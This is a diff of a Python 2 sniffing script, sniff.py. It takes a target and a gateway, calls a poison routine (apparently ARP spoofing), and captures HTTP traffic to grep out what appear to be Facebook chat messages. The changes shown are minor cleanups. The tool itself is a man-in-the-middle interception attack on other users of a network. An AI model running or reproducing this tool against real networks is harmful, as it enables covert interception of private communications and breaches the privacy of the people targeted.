@@ -1,7 +1,6 @@
 #!/usr/bin/env python
 
 import sys, os
-import time
 import dpkt, pcap
 
 def check_root():
@@ -35,19 +34,11 @@ def fbchatgrep(p,pid):
         print(" ")
     return pid
         
-
-def usage():
-    print >>sys.stderr, 'usage: %s [-i device] [pattern]' % sys.argv[0]
-    sys.exit(1)
-
-def ether_decode(p):
-    return ':'.join(['%02x' % ord(x) for x in str(p)])
-
 if __name__ == '__main__':
   if len(sys.argv) < 4:
     print 'usage: sniff.py <interface> <target> <gateway>'
     sys.exit(0)
-  pid="fobar" 
+  pid="fo bar" 
   pc = pcap.pcap(sys.argv[1])
   pc.setfilter('tcp and port 80') # Sniff only http
   try:
@@ -56,10 +47,10 @@ if __name__ == '__main__':
     poison(sys.argv[1],sys.argv[2],sys.argv[3])
     for ts, pkt in pc:
       packet = dpkt.ethernet.Ethernet(pkt)
-      pid=fbchatgrep(packet,pid)
+      pid = fbchatgrep(packet,pid)
 
   except KeyboardInterrupt:
-    os.system("sysctl -w .net.ipv4.ip_forward=0 > /dev/null")
+    os.system("sysctl -w .net.ipv4.ip_forward=0 > /dev/null") # Disable IP forward
     nrecv, ndrop, nifdrop = pc.stats()
     print '\n%d packets received by filter' % nrecv
     print '%d packets dropped by kernel' % ndrop
